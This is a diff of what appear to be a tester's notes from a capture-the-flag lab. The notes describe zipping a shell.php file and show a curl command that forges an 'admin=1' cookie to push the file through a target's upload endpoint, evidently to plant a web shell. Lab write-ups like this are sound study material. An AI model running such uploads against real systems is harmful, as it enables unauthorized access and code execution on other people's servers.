@@ -86,4 +86,14 @@ curl command to upload file
 crete zip file :
 zip -o data shell.php 
 create data.zip file without compression 
+
+using curl will then post the file to the webserver byte for byte there by I don't have the problems with Null bytes, that I have when I use system copy paste.
+
+-F    form <name=content> Specify multipart MIME data
+     --form-string <name=string> Specify multipart MIME data
+     
+     --cookie <data> Send cookies from string/file
+ -c, --cookie-jar <filename> Write cookies to <filename> after operation
+
+
 curl --cookie "admin=1; PHPSESSID=oj82onalo99pfrtonsaven2jr5" -F "submit=true" -F "token=b8ed78fb5c0b1a51dd48ed4d53ef438dcb6d3ca34f0b54781c137c85bd0834d6" -F "tip=<hello.php.gz" http://10.10.10.80/?op=upload
